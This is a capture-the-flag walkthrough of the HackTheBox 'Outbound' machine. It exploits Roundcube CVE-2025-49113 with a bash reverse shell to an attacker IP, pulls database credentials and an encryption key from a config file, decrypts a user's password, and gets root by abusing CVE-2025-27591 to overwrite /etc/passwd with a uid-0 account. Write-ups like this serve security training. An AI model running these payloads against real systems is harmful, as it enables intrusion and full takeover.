 🚀 Introduction

In this challenge, we first Exploring a webmail service and exploiting a known vulnerability that allowed us to gain initial access. After obtaining a user account, we looked deeper into the server and found another security issue that let us escalate our privileges to become the root user, giving full control of the machine. This walkthrough details each step clearly, making it easy to follow even for beginners


Returning to HackTheBox after a long break, I discovered an intriguing new machine—Outbound. Eager to dust off my hacking skills, I quickly jumped into action by setting up the VPN connection:

sudo openvpn outbound.ovpn

🔍 Reconnaissance

Next, I performed an Nmap scan:

```bash
nmap -sC -sV -oN scan.txt 10.10.11.77
```
I identified two open ports:
![namp](/outbound.png)


22 (SSH)

80 (HTTP)

🌐 Web Enumeration

Visiting http://10.10.11.77 redirected me to mail.outbound.htb, prompting me to update my /etc/hosts file:

```bash
10.10.11.77 mail.outbound.htb
```
After refreshing the page, I found a Roundcube webmail login with provided credentials directly on the page.

Logging in, I immediately noticed the Roundcube version had a known vulnerability (CVE-2025-49113).

Quick reminder: Always check software versions for known CVEs!

🛠️ Exploitation

I set up a listener on my attacker machine:
```bash
nc -nlvp 4444
```
Then, I cloned and executed the exploit:
```bash
git clone https://github.com/fearsoff-org/CVE-2025-49113.git
cd CVE-2025-49113
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.32/4444 0>&1'"
```
The exploit executed successfully, giving me a shell as www-data.

📂 Exploring Files

Navigating the server, I discovered a crucial config directory:

/var/www/html/roundcube/public_html/roundcube/config

Inside config.inc.php, 

![Image](/config.png)

I found database credentials:

```bash
DB User: roundcube
DB Pass: RCDBPass2025
DB Name: roundcube
```
💾 Database Exploration

With the credentials, I accessed the database:
```bash
mysql -u roundcube -pRCDBPass2025 roundcube
SHOW TABLES;
SELECT * FROM session;
```
The session data was Base64-encoded. Decoding using CyberChef.io,
![Base64](/sessions.png)

I initially found Tyler’s credentials (already known), then Jacob’s encrypted session data.

Jacob's password was encrypted using Triple DES (DES-EDE3-CBC). Leveraging the encryption key (rcmail-!24ByteDESkey*Str) from config.inc.php, I decrypted Jacob’s password successfully.

🔑 SSH Access

With Jacob’s decrypted password, 

![jacobpass](/jacobpass.png)

I accessed via SSH:
```bash
ssh jacob@10.10.11.77
```
Jacob's SSH password:

gY4Wr3a1evp4

Successfully obtained the user flag.

🛡️ Privilege Escalation

Checking Jacob’s privileges:
```bash
sudo -l
```

Output:
```bash
(ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```
Jacob could run /usr/bin/below as root, excluding certain arguments.

Searching vulnerabilities related to /usr/bin/below, I discovered CVE-2025-27591, allowing arbitrary file manipulation through logs. I executed the following steps:

Exploit Steps:

Navigate to log directory:
```bash
cd /var/log/below
```
Create a malicious user entry:
```bash
echo 'root2:aacFCuAIHhrCM:0:0:,,,:/root:/bin/bash' > root2
```
Remove original log file:
```bash
rm error_root.log
```
Create a symbolic link to /etc/passwd:
```bash
ln -s /etc/passwd /var/log/below/error_root.log
```
Trigger vulnerability:
```bash
sudo /usr/bin/below
```
Overwrite /etc/passwd:
```bash
cp root2 error_root.log
```
Switch to root-level user:
```bash
su root2
```

Root access achieved. 🎉 Successfully obtained the root flag!
